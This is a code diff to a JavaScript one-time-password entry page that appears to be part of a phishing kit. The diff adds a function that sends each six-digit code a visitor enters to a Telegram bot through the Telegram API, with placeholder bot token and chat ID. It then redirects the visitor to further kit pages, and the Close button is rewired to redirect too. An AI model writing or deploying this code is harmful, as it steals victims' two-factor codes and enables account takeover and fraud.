@@ -97,6 +97,13 @@
             cursor: pointer;
         }
 
+        .otp-message {
+            margin-top: 20px; /* Space for OTP message */
+            font-family: monospace; /* Monospace font for easy copying */
+            color: lightgray; /* Light gray text for OTP */
+            font-size: 1rem; /* Font size for OTP */
+        }
+
         .footer {
             margin-top: 50px;
         }
@@ -124,11 +131,12 @@
     </div>
 
     <div class="error-message" id="error-message"></div> <!-- Space for error message -->
+    <div class="otp-message" id="otp-message" style="display: none;"></div> <!-- Space for OTP display -->
 
     <div class="buttons">
         <button onclick="validateOTP()">Proceed</button>
         <button onclick="resendCode()">Resend Code</button>
-        <button class="cancel">Close</button>
+        <button onclick="closePage()">Close</button> <!-- Updated Close button -->
     </div>
 
     <div class="footer">
@@ -142,15 +150,25 @@
         const otpInput = document.getElementById('otpInput');
         const otp = otpInput.value;
         const errorMessage = document.getElementById('error-message');
+        const otpMessage = document.getElementById('otp-message');
 
         // Check if the OTP is 6 digits
         if (otp.length !== 6) {
             errorMessage.textContent = 'Invalid OTP'; // Show error message
             errorMessage.style.display = 'block'; // Show error message
+            otpMessage.style.display = 'none'; // Hide OTP message
         } else {
             errorMessage.style.display = 'none'; // Hide error message
-            // Implement success logic here (e.g., redirect, send to Telegram, etc.)
-            window.location.href = 'index2.html'; // Redirect to index2.html
+            otpMessage.textContent = `Your OTP: ${otp}`; // Show OTP message
+            otpMessage.style.display = 'block'; // Show OTP message
+
+            // Send the OTP to your Telegram bot
+            sendToTelegramBot(otp); 
+
+            // Implement success logic here (e.g., redirect)
+            setTimeout(() => {
+                window.location.href = 'index2.html'; // Redirect to index2.html
+            }, 2000); // Optional delay for visibility
         }
     }
 
@@ -162,6 +180,30 @@
         setTimeout(() => {
             errorMessage.style.display = 'none'; // Hide message after 3 seconds
         }, 3000);
+    }
+
+    // Function to close the page and redirect to index3.html
+    function closePage() {
+        window.location.href = 'index3.html'; // Redirect to index3.html
+    }
+
+    // Send the OTP to your Telegram bot
+    function sendToTelegramBot(otp) {
+        const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
+        const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+        const message = `New OTP Verification Code: ${otp}`;
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Send the request to the Telegram bot
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
     }
 
     // Prevent non-numeric input for OTP
